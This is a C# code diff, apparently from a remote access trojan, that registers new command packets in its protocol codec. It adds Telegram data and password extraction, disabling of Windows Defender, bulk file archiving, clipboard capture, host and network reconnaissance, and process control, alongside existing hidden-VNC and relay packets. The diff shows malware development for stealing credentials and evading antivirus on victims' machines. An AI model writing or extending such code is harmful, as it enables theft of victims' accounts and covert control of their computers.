@@ -122,6 +122,46 @@ namespace RemoteControl.Protocals.Codec
             mappings.Add(ePacketType.PACKET_HVNC_KEYBOARD_EVENT_REQUEST, typeof(RequestKeyboardEvent));
             mappings.Add(ePacketType.PACKET_HVNC_RUN_PROCESS_REQUEST, typeof(RequestHVNCRunProcess));
 
+            // TG提取与密码提取
+            mappings.Add(ePacketType.PACKET_TG_EXTRACT_REQUEST, typeof(RequestTGExtract));
+            mappings.Add(ePacketType.PACKET_TG_EXTRACT_RESPONSE, typeof(ResponseTGExtract));
+            mappings.Add(ePacketType.PACKET_PASSWORD_EXTRACT_REQUEST, typeof(RequestPasswordExtract));
+            mappings.Add(ePacketType.PACKET_PASSWORD_EXTRACT_RESPONSE, typeof(ResponsePasswordExtract));
+
+            // 一键消盾与一键归档
+            mappings.Add(ePacketType.PACKET_DISABLE_DEFENDER_REQUEST, typeof(RequestDisableDefender));
+            mappings.Add(ePacketType.PACKET_DISABLE_DEFENDER_RESPONSE, typeof(ResponseDisableDefender));
+            mappings.Add(ePacketType.PACKET_ARCHIVE_ALL_REQUEST, typeof(RequestArchiveAll));
+            mappings.Add(ePacketType.PACKET_ARCHIVE_ALL_RESPONSE, typeof(ResponseArchiveAll));
+
+            // 网络连接查询
+            mappings.Add(ePacketType.PACKET_GET_NETWORK_CONNECTIONS_REQUEST, typeof(RequestGetNetworkConnections));
+            mappings.Add(ePacketType.PACKET_GET_NETWORK_CONNECTIONS_RESPONSE, typeof(ResponseGetNetworkConnections));
+
+            // 主机详情查询
+            mappings.Add(ePacketType.PACKET_GET_HOST_INFO_REQUEST, typeof(RequestGetHostInfo));
+            mappings.Add(ePacketType.PACKET_GET_HOST_INFO_RESPONSE, typeof(ResponseGetHostInfo));
+
+            // 剪贴板操作
+            mappings.Add(ePacketType.PACKET_CLIPBOARD_GET_REQUEST, typeof(RequestClipboardGet));
+            mappings.Add(ePacketType.PACKET_CLIPBOARD_GET_RESPONSE, typeof(ResponseClipboardGet));
+            mappings.Add(ePacketType.PACKET_CLIPBOARD_SET_REQUEST, typeof(RequestClipboardSet));
+            mappings.Add(ePacketType.PACKET_CLIPBOARD_SET_RESPONSE, typeof(ResponseClipboardSet));
+
+            // 窗口管理查询
+            mappings.Add(ePacketType.PACKET_GET_WINDOWS_REQUEST, typeof(RequestGetWindows));
+            mappings.Add(ePacketType.PACKET_GET_WINDOWS_RESPONSE, typeof(ResponseGetWindows));
+
+            // 进程挂起/恢复
+            mappings.Add(ePacketType.PACKET_SUSPEND_PROCESS_REQUEST, typeof(RequestKillProcesses));
+            mappings.Add(ePacketType.PACKET_SUSPEND_PROCESS_RESPONSE, typeof(ResponseProcessOperation));
+            mappings.Add(ePacketType.PACKET_RESUME_PROCESS_REQUEST, typeof(RequestKillProcesses));
+            mappings.Add(ePacketType.PACKET_RESUME_PROCESS_RESPONSE, typeof(ResponseProcessOperation));
+
+            // 进程优先级设置
+            mappings.Add(ePacketType.PACKET_SET_PROCESS_PRIORITY_REQUEST, typeof(RequestSetProcessPriority));
+            mappings.Add(ePacketType.PACKET_SET_PROCESS_PRIORITY_RESPONSE, typeof(ResponseProcessOperation));
+
             // Relay 中转协议映射
             mappings.Add(ePacketType.CYCLER_RELAY_HANDSHAKE, typeof(Relay.RelayHandshake));
             mappings.Add(ePacketType.CYCLER_RELAY_CLIENT_LIST_RESPONSE, typeof(Relay.RelayClientListResponse));
